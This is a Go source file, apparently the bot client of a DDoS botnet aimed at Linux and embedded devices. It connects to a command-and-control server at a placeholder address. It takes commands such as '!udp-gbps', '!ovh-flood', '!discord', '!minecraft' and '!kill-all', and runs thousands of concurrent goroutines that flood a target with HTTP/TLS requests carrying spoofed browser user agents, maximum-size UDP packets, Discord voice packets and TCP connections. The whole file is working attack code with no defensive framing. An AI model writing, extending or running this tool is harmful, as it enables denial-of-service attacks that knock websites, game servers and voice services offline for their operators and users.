// language: Go, file: bot.go, target: Linux/Embedded
package main

import (
	"bufio"
	"bytes"
	"context"
	"crypto/tls"
	"fmt"
	"math/rand"
	"net"
	"net/http"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

const serverAddr = "IP:7002"

var workers = 4096

func main() {
	for {
		c, err := net.Dial("tcp", serverAddr)
		if err != nil {
			time.Sleep(5 * time.Second)
			continue
		}
		rd := bufio.NewReader(c)
		for {
			line, err := rd.ReadString('\n')
			if err != nil {
				break
			}
			go dispatch(strings.TrimSpace(line))
		}
		c.Close()
		time.Sleep(5 * time.Second)
	}
}

func dispatch(raw string) {
	f := strings.Fields(raw)
	if len(f) < 4 {
		return
	}
	cmd, host, portStr, durStr := f[0], f[1], f[2], f[3]
	port, _ := strconv.Atoi(portStr)
	secs, _ := strconv.Atoi(durStr)

	switch cmd {
	case "!tls", "!http", "!browser", "!httpbypass", "!http-focus":
		go vectorHTTP(host, port, secs, cmd)
	case "!udp-gbps", "!udpbypass", "!udp-focus", "!home-holder":
		go vectorUDP(host, port, secs)
	case "!discord":
		go vectorDiscordVoice(host, port, secs)
	case "!tcp", "!syn", "!game", "!ovh-flood", "!fivem", "!minecraft", "!tcp-focus", "!pps-focus":
		go vectorTCP(host, port, secs)
	case "!kill-all":
		go vectorKillAll(host, port, secs)
	}
}

func vectorHTTP(host string, port, secs int, method string) {
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(secs)*time.Second)
	defer cancel()

	tr := &http.Transport{
		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
		DisableKeepAlives:   false,
		MaxIdleConnsPerHost: 1000,
	}
	client := &http.Client{Transport: tr, Timeout: 2 * time.Second}
	url := fmt.Sprintf("http://%s:%d/", host, port)
	if port == 443 || method == "!tls" || method == "!browser" || method == "!httpbypass" {
		url = fmt.Sprintf("https://%s:%d/", host, port)
	}

	uas := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
		"Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
	}

	var wg sync.WaitGroup
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				select {
				case <-ctx.Done():
					return
				default:
					req, err := http.NewRequest("GET", url, nil)
					if err != nil {
						continue
					}
					req.Header.Set("User-Agent", uas[rand.Intn(len(uas))])
					req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
					req.Header.Set("Connection", "keep-alive")
					if resp, err := client.Do(req); err == nil {
						resp.Body.Close()
					}
				}
			}
		}()
	}
	wg.Wait()
}

func vectorUDP(host string, port, secs int) {
	dst, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", host, port))
	if err != nil {
		return
	}
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(secs)*time.Second)
	defer cancel()

	payload := make([]byte, 65507)
	rand.Read(payload)

	var wg sync.WaitGroup
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, err := net.DialUDP("udp", nil, dst)
			if err != nil {
				return
			}
			defer conn.Close()
			for {
				select {
				case <-ctx.Done():
					return
				default:
					conn.Write(payload)
				}
			}
		}()
	}
	wg.Wait()
}

func vectorDiscordVoice(host string, port, secs int) {
	if port == 0 {
		port = 50001
	}
	dst, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", host, port))
	if err != nil {
		return
	}
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(secs)*time.Second)
	defer cancel()

	magicKeepalive := []byte{0x13, 0x37, 0xca, 0xfe, 0x00, 0x00, 0x00, 0x01}
	var wg sync.WaitGroup
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, err := net.DialUDP("udp", nil, dst)
			if err != nil {
				return
			}
			defer conn.Close()
			for {
				select {
				case <-ctx.Done():
					return
				default:
					if rand.Intn(2) == 0 {
						conn.Write(magicKeepalive)
					} else {
						buf := make([]byte, 160)
						rand.Read(buf)
						conn.Write(buf)
					}
				}
			}
		}()
	}
	wg.Wait()
}

func vectorTCP(host string, port, secs int) {
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(secs)*time.Second)
	defer cancel()
	target := fmt.Sprintf("%s:%d", host, port)
	payload := bytes.Repeat([]byte("FOCUS_ENGINE_SYN_BURST_X"), 128)

	var wg sync.WaitGroup
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				select {
				case <-ctx.Done():
					return
				default:
					conn, err := net.DialTimeout("tcp", target, 1*time.Second)
					if err == nil {
						conn.SetWriteDeadline(time.Now().Add(1 * time.Second))
						conn.Write(payload)
						conn.Close()
					}
				}
			}
		}()
	}
	wg.Wait()
}

func vectorKillAll(host string, port, secs int) {
	var ops int64
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(secs)*time.Second)
	defer cancel()
	target := fmt.Sprintf("%s:%d", host, port)
	heavyPayload := bytes.Repeat([]byte{0xFF, 0x00, 0xAA, 0x55, 0xCC, 0x33}, 2048)

	var wg sync.WaitGroup
	for i := 0; i < workers*2; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				select {
				case <-ctx.Done():
					return
				default:
					conn, err := net.DialTimeout("tcp", target, 500*time.Millisecond)
					if err == nil {
						conn.Write(heavyPayload)
						conn.Close()
					}
					atomic.AddInt64(&ops, 1)
				}
			}
		}()
	}
	wg.Wait()
}
